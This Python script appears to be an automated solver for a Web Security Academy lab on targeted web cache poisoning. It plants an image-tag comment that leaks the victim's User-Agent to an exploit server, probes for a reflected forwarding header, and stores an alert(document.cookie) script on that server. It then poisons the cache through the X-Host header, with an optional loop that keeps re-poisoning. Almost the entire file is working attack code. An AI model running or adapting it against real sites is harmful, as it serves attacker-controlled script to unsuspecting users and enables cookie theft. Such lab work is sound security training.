import typer, requests, re
from lxml import html
from rich.panel import Panel
from rich.rule import Rule
from rich.console import Console
from rich.live import Live
from rich.table import Table
from rich.prompt import Prompt
from rich.markup import escape
from time import sleep
from textwrap import dedent
from urllib.parse import parse_qs, urljoin, urlparse


BASE_URL = "https://{}.h1-web-security-academy.net/".format
BASE_EXPLOIT = "https://exploit-{}.exploit-server.net/".format

HEADERS = {
    "User-Agent": "Mozilla/5.0"
}

def main(
    url: str = typer.Option(None, "--url"),
    exploit: str = typer.Option(None, "--exploit"),
):
    if not url:
        url = typer.prompt("Target ID")
    if not exploit:
        exploit = typer.prompt("Exploit server ID")
    url = BASE_URL(url)
    exploit = BASE_EXPLOIT(exploit)
    session = requests.Session()
    console = Console()

    console.print(
        Panel.fit(
            "[bold white]Find Victim User-Agent[/bold white]",
            title="[bold cyan]Part One[/bold cyan]",
            border_style="cyan",
        )
    )

    with console.status("[bold yellow]Finding post to comment...[/bold yellow]"):
        r = session.get(url, headers=HEADERS, timeout=15)
        r.raise_for_status()
        tree = html.fromstring(r.content)
        blog_post = tree.xpath("//body/div[@theme='blog']/section[@class='maincontainer']/div[@class='container is-page']/section[@class='blog-list']/div[1]/a[1]/@href").pop()
        console.print(f"[bold green][+][/bold green] Blog post: [cyan]{blog_post}[/cyan]")


        post_id = parse_qs(urlparse(blog_post).query).get("postId", [None]).pop()
        console.print(f"[bold green][+][/bold green] Post ID: [yellow]{post_id}[/yellow]")


        r = session.get(f"{urljoin(url, blog_post)}", headers=HEADERS, timeout=15)
        r.raise_for_status()
        tree = html.fromstring(r.content)
        csrf_token = tree.xpath("//body/div[@theme='blog']/section[@class='maincontainer']/div[@class='container is-page']/div[@class='blog-post']//section[@class='add-comment']/form/input[@name='csrf']/@value").pop()
        sleep(2)


    comment_payload = {
        "csrf": csrf_token,
        "postId": post_id,
        "comment": f'<img src="{exploit}exploit" />',
        "name": "wiener",
        "email": "wiener@peter.net",
        "website": ""
    }

    table = Table(
        title="[bold cyan]Malicious Comment[/bold cyan]",
        border_style="cyan",
        show_lines=True,
    )
    table.add_column("Key", style="bold yellow", no_wrap=True)
    table.add_column("Value", style="white")

    for key, value in comment_payload.items():
        table.add_row(key, str(value))

    console.print(table, markup=False)


    with console.status("[bold yellow]Commenting the post...[/bold yellow]"):
        r = session.post(f"{url}post/comment", data=comment_payload, headers=HEADERS, timeout=15)
        r.raise_for_status()
        sleep(5)


    last_exploit_line = None
    with console.status("[bold yellow]Waiting for the victim to see the comment...[/bold yellow]"):
        sleep(5)
        while not last_exploit_line:
            r = session.get(f"{exploit}log", headers=HEADERS, timeout=15)
            r.raise_for_status()
            tree = html.fromstring(r.content)
            log_text = tree.xpath("string(//body/section[@class='maincontainer is-page']/pre[@class='container'])")
        
            last_exploit_line = next(
                (line for line in reversed(log_text.splitlines()) if '"GET /exploit' in line),
                None,
            )

            if not last_exploit_line:
                sleep(2)


    console.print(f"[bold green][+][/bold green] Victim log: [bold yellow]{escape(last_exploit_line)}[/bold yellow]")
    ua_match = re.search(
        r'"user-agent:\s*([^"]+)"',
        last_exploit_line,
        re.IGNORECASE | re.DOTALL,
    )
    victim_ua = ua_match.group(1).strip() if ua_match else None
    if victim_ua:
        console.print(f"[bold green][+][/bold green] Victim User-Agent: [bold yellow]{escape(victim_ua)}[/bold yellow]")

    sleep(2)
    console.print()



    console.print(
        Panel.fit(
            "[bold white]Find Reflected Header[/bold white]",
            title="[bold cyan]Part Two[/bold cyan]",
            border_style="cyan",
        )
    )
    sleep(1)


    uuid = "93f000f5-78b4-44c0-9c7d-48e7a7361ec5"
    possible_reflected_headers = ["X-Forwarded-Host", "X-Forwarded-Scheme", "X-Forwarded-Proto", "X-Original-URL", "X-Rewrite-URL", "X-Host", "X-Forwarded-Server"]


    
    console.print()
    table = Table(title="[bold cyan]Possible Reflected Headers[/bold cyan]", border_style="cyan")
    table.add_column("#", style="dim", justify="right", no_wrap=True)
    table.add_column("Header", style="bold", no_wrap=True)
    table.add_column("State", width=12, no_wrap=True)

    for i, h in enumerate(possible_reflected_headers):
        table.add_row(str(i + 1), escape(h), "[dim]Waiting[/dim]")

    reflected_header = None
    endpoint = ""
    with Live(table, console=console, refresh_per_second=8) as live:
        for i, header in enumerate(possible_reflected_headers):
            table.columns[2]._cells[i] = "[bold yellow]Testing...[/bold yellow]"
            live.refresh()

            r = session.get(url, params={"cb": i}, headers={**HEADERS, header: uuid}, timeout=15)
            r.raise_for_status()
            matches = html.fromstring(r.content).xpath(f"//*[contains(., '{uuid}')] | //@*[contains(., '{uuid}')]")

            if matches and not reflected_header:
                reflected_header = header
                for m in matches:
                    endpoint = urlparse(str(m)).path

            table.columns[2]._cells[i] = "[bold green]Reflected[/bold green]" if matches else "[dim]No[/dim]"
            live.refresh()


    console.print(
        f"[bold green][+][/bold green] Header [bold yellow]{escape(reflected_header)}[/bold yellow] "
        f"reflected on endpoint [bold cyan]{escape(endpoint)}[/bold cyan]"
    )


    sleep(2)

    console.print()
    console.print(
        Panel.fit(
            "[bold white]Web Cache Poisoning[/bold white]",
            title="[bold cyan]Part Three[/bold cyan]",
            border_style="cyan",
        )
    )


    malicious_payload = {
        "urlIsHttps": "on",
        "responseFile": endpoint,
        "responseHead": dedent("""\
            HTTP/1.1 200 OK
            Content-Type: application/javascript; charset=utf-8"""),
        "responseBody": "alert(document.cookie)",
        "formAction": "STORE"
    }

    table = Table(
        title="[bold cyan]Malicious Payload[/bold cyan]",
        border_style="cyan",
        show_lines=True,
    )
    table.add_column("Key", style="bold yellow", no_wrap=True)
    table.add_column("Value", style="white")

    for key, value in malicious_payload.items():
        table.add_row(key, str(value))

    console.print(table, markup=False)


    
    with console.status("[bold yellow]Storing the malicious payload on the exploit server...[/bold yellow]"):
        r = session.post(exploit, data=malicious_payload, headers=HEADERS, timeout=15)
        r.raise_for_status()
        sleep(5)

    console.print("[bold green][+][/bold green] Malicious payload stored!")
    sleep(1)



    malicious_header = {
        "User-Agent": victim_ua,
        "X-Host": exploit.removeprefix("https://").rstrip("/")
    }
    
    table = Table(
        title="[bold cyan]Malicious Headers[/bold cyan]",
        border_style="cyan",
        show_lines=True,
    )
    table.add_column("Key", style="bold yellow", no_wrap=True)
    table.add_column("Value", style="white")

    for key, value in malicious_header.items():
        table.add_row(key, str(value))

    console.print(table, markup=False)


    with console.status("[bold yellow]Poisoning the cache...[/bold yellow]"):
        r = session.get(url, headers=malicious_header, timeout=15)
        r.raise_for_status()
        sleep(5)


    last_exploit_line = None
    with console.status("[bold yellow]Waiting for the victim to request the page...[/bold yellow]"):
        sleep(5)
        while not last_exploit_line:
            r = session.get(f"{exploit}log", headers=HEADERS, timeout=15)
            r.raise_for_status()
            tree = html.fromstring(r.content)
            log_text = tree.xpath("string(//body/section[@class='maincontainer is-page']/pre[@class='container'])")

            last_exploit_line = next(
                (line for line in reversed(log_text.splitlines()) if f'"GET {endpoint}' in line),
                None,
            )

            if not last_exploit_line:
                sleep(2)


    console.print(f"[bold green][+][/bold green] Victim log: [bold yellow]{escape(last_exploit_line)}[/bold yellow]")
    console.print()
    console.print("[bold green][+] User was served by a poisoned cache![/bold green]")



    console.print(Rule("[bold green]Lab Ended[/bold green]", style="green"))

    choice = Prompt.ask(
        dedent("""\
            [bold yellow] q [/bold yellow]: quit
            [bold cyan] c [/bold cyan]: continue poisoning

            [bold white] Choice[/bold white]"""),
        choices=["q", "c"],
        default="q",
        show_default=False,
        console=console,
        show_choices=False
    ).lower()

    if choice == "c":
        console.print("\n Press [bold yellow]Ctrl+C[/bold yellow] to stop poisoning")
        try:
            while True:
                r = session.get(url, headers=malicious_header, timeout=15)
                r.raise_for_status()

                x_cache = (r.headers.get("X-Cache") or "").strip().lower()
                cache_control = r.headers.get("Cache-Control") or ""
                age_raw = r.headers.get("Age")

                match = re.search(r"\bmax-age=(\d+)", cache_control, re.IGNORECASE)
                max_age = int(match.group(1)) if match else 30
                age = int(age_raw) if age_raw and age_raw.isdigit() else 0

                if x_cache == "hit":
                    sleep(max(1, (max_age - age) - 5))
                    while (r.headers.get("X-Cache") or "").strip().lower() != "miss":
                        sleep(1)
                        r = session.get(url, headers=malicious_header, timeout=15)
                        r.raise_for_status()
        except KeyboardInterrupt:
            pass



if __name__ == "__main__":
    typer.run(main)

